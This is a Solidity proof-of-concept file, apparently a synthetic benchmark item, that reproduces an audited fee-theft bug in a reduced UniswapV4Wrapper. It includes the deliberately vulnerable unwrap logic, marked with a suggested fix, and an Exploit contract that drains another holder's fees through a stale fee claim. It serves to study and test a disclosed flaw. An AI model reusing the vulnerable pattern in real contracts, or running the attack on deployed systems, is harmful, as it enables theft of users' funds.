// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    VII Finance — Fees can be stolen from partially unwrapped UniswapV4Wrapper
    (Cyfrin 2025-07-15 vii-v2.0; finding #61328, Giovanni Di Siena)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: UniswapV4Wrapper::_unwrap pays proportionalShare of tokensOwed
    fees on partial unwrap but NEVER decrements tokensOwed. After a
    full-via-partial unwrap + recover + re-wrap, the stale tokensOwed still
    claims fees that now sit in the wrapper for OTHER partially-unwrapped
    holders — the attacker drains them.

    Vulnerable transfer lines preserved with @> VULN.
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced UniswapV4Wrapper fee-accounting surface.
contract UniswapV4Wrapper {
    MockERC20 public immutable currency0;
    MockERC20 public immutable currency1;

    struct FeesOwed {
        uint256 fees0Owed;
        uint256 fees1Owed;
    }

    mapping(uint256 => FeesOwed) public tokensOwed;
    mapping(uint256 => uint256) public totalSupplyOf;
    mapping(address => mapping(uint256 => uint256)) public balanceOfToken;
    mapping(uint256 => uint256) public liquidityOf;
    mapping(uint256 => bool) public recovered;

    uint256 public constant FULL_AMOUNT = 1e18;

    constructor(MockERC20 c0, MockERC20 c1) {
        currency0 = c0;
        currency1 = c1;
    }

    function totalSupply(uint256 tokenId) public view returns (uint256) {
        return totalSupplyOf[tokenId];
    }

    function balanceOf(address account, uint256 tokenId) public view returns (uint256) {
        return balanceOfToken[account][tokenId];
    }

    function seedWrap(uint256 tokenId, address to, uint256 supply, uint256 liquidity) external {
        require(totalSupplyOf[tokenId] == 0, "exists");
        totalSupplyOf[tokenId] = supply;
        balanceOfToken[to][tokenId] = supply;
        liquidityOf[tokenId] = liquidity;
    }

    /// @dev Accrue fees into the wrapper (as if pool settled LP fees to the wrapper).
    function accrueFees(uint256 tokenId, uint256 fees0, uint256 fees1) external {
        currency0.mint(address(this), fees0);
        currency1.mint(address(this), fees1);
        tokensOwed[tokenId].fees0Owed += fees0;
        tokensOwed[tokenId].fees1Owed += fees1;
    }

    function proportionalShare(uint256 tokenId, uint256 value, uint256 amount) public view returns (uint256) {
        uint256 ts = totalSupplyOf[tokenId];
        if (ts == 0) return 0;
        return (value * amount) / ts;
    }

    /// @notice Partial unwrap — burns `amount` ERC-6909, pays principal + fee share.
    function unwrap(address from, uint256 tokenId, address to, uint256 amount, bytes calldata /*extraData*/)
        external
    {
        _unwrap(to, tokenId, amount);
        _burnFrom(from, tokenId, amount);
    }

    /// @notice Full unwrap of remaining supply (or empty position recovery when supply==0).
    function unwrap(address from, uint256 tokenId, address /*to*/) external {
        uint256 ts = totalSupplyOf[tokenId];
        if (ts > 0) {
            require(balanceOfToken[from][tokenId] == ts, "not sole owner");
            _burnFrom(from, tokenId, ts);
        }
        recovered[tokenId] = true;
    }

    /// @dev Re-wrap a recovered position. Stale tokensOwed is NOT cleared — the bug surface.
    function rewrap(uint256 tokenId, address to, uint256 supply, uint256 liquidity) external {
        require(recovered[tokenId], "not recovered");
        require(totalSupplyOf[tokenId] == 0, "still live");
        recovered[tokenId] = false;
        totalSupplyOf[tokenId] = supply;
        balanceOfToken[to][tokenId] = supply;
        liquidityOf[tokenId] = liquidity;
        // tokensOwed[tokenId] deliberately left as-is (stale fee claim survives re-wrap)
    }

    /// @notice Reduced UniswapV4Wrapper::_unwrap — fees paid from tokensOwed but NOT decremented.
    function _unwrap(address to, uint256 tokenId, uint256 amount) internal {
        uint256 liq = liquidityOf[tokenId];
        uint256 liquidityToRemove = proportionalShare(tokenId, liq, amount);
        uint256 amount0 = liquidityToRemove; // 1:1 principal for synthetic
        uint256 amount1 = liquidityToRemove;
        liquidityOf[tokenId] = liq - liquidityToRemove;

        // Principal settles into wrapper then out to recipient
        currency0.mint(address(this), amount0);
        currency1.mint(address(this), amount1);

        //amount0 and amount1 is the part of the liquidity
        //token0Owed - amount0 and token1Owed - amount1 are the total fees
        poolKey_currency0_transfer(to, amount0 + proportionalShare(tokenId, tokensOwed[tokenId].fees0Owed, amount)); // @> VULN: tokensOwed never decremented after fee payout
        poolKey_currency1_transfer(to, amount1 + proportionalShare(tokenId, tokensOwed[tokenId].fees1Owed, amount)); // @> VULN: tokensOwed never decremented after fee payout
        // FIX: uint256 f0 = proportionalShare(...); tokensOwed[tokenId].fees0Owed -= f0; then transfer amount0+f0
    }

    function poolKey_currency0_transfer(address to, uint256 amt) internal {
        currency0.transfer(to, amt);
    }

    function poolKey_currency1_transfer(address to, uint256 amt) internal {
        currency1.transfer(to, amt);
    }

    function _burnFrom(address from, uint256 tokenId, uint256 amount) internal {
        require(balanceOfToken[from][tokenId] >= amount, "burn bal");
        balanceOfToken[from][tokenId] -= amount;
        totalSupplyOf[tokenId] -= amount;
    }
}

/// @dev Victim actor that holds ERC-6909 and can call partial unwrap.
contract VictimHelper {
    UniswapV4Wrapper public immutable wrapper;

    constructor(UniswapV4Wrapper w) {
        wrapper = w;
    }

    function partialUnwrap(uint256 tokenId, uint256 amount) external {
        wrapper.unwrap(address(this), tokenId, address(this), amount, bytes(""));
    }
}

/// @notice Fee-theft attack via stale tokensOwed after re-wrap.
contract Exploit {
    MockERC20 public token0; // CREATE nonce 1
    MockERC20 public token1; // CREATE nonce 2
    UniswapV4Wrapper public wrapper; // CREATE nonce 3 — vulnerable
    VictimHelper public victim; // CREATE nonce 4

    uint256 public constant V_ID = 1;
    uint256 public constant A_ID = 2;
    uint256 public constant SUPPLY = 1000;
    uint256 public constant LIQ = 1000;
    uint256 public constant FEES = 100;

    uint256 public stolen0;
    uint256 public feeTheft0;

    constructor() {
        token0 = new MockERC20();
        token1 = new MockERC20();
        wrapper = new UniswapV4Wrapper(token0, token1);
        victim = new VictimHelper(wrapper);
    }

    function run() external {
        address attacker = address(this);

        // 1. Victim wraps position 1; attacker wraps position 2
        wrapper.seedWrap(V_ID, address(victim), SUPPLY, LIQ);
        wrapper.seedWrap(A_ID, attacker, SUPPLY, LIQ);

        // 2. Accrue LP fees for both positions into the wrapper
        wrapper.accrueFees(V_ID, FEES, FEES);
        wrapper.accrueFees(A_ID, FEES, FEES);
        // wrapper holds 200 of each currency as fees

        // 3. Victim partially unwraps 10% → receives 10% of fees; tokensOwed NOT reduced
        victim.partialUnwrap(V_ID, SUPPLY / 10);
        // Victim took 10 fees; tokensOwed[V_ID] still 100; wrapper fee residual for victim = 90
        // Attacker fees still fully in wrapper (100)

        // 4. Attacker fully unwraps A_ID via partial overload (burns all 1000)
        wrapper.unwrap(attacker, A_ID, attacker, SUPPLY, bytes(""));
        // received principal 1000 + fees 100; tokensOwed[A_ID] STILL 100 (stale)

        // 5. Recover empty position + re-wrap (stale tokensOwed survives)
        wrapper.unwrap(attacker, A_ID, attacker); // full unwrap / recover
        wrapper.rewrap(A_ID, attacker, SUPPLY, LIQ);
        // No new fees accrued for A_ID; tokensOwed[A_ID] still 100

        // 6. Steal: partial unwrap 90% of re-wrapped A_ID pays 90% of STALE tokensOwed
        //    from wrapper balance that still holds victim residual fees
        uint256 before0 = token0.balanceOf(attacker);
        wrapper.unwrap(attacker, A_ID, attacker, (SUPPLY * 9) / 10, bytes(""));
        stolen0 = token0.balanceOf(attacker) - before0;

        // Principal for 90% of re-wrap = 900; anything above is stolen fees
        require(stolen0 > 900, "must extract more than principal");
        feeTheft0 = stolen0 - 900;
        require(feeTheft0 == 90, "90% of stale 100 fee claim");

        // Harm: wrapper can no longer fully fund the victim's remaining fee claim
        (uint256 victimClaimed,) = wrapper.tokensOwed(V_ID);
        // victimClaimed still 100 (never decremented), but wrapper balance is short
        uint256 wrapperBal = token0.balanceOf(address(wrapper));
        // After victim partial: paid 10 fees; after attacker first unwrap: paid 100 fees;
        // after steal: paid another 90 fees. Remaining wrapper fees ≈ 200 - 10 - 100 - 90 = 0
        // plus any principal dust. Victim still "owed" 90 residual but tokensOwed says 100.
        require(wrapperBal < victimClaimed, "wrapper insolvent for victim fee claim");
        require(feeTheft0 > 0, "fees stolen");
    }
}
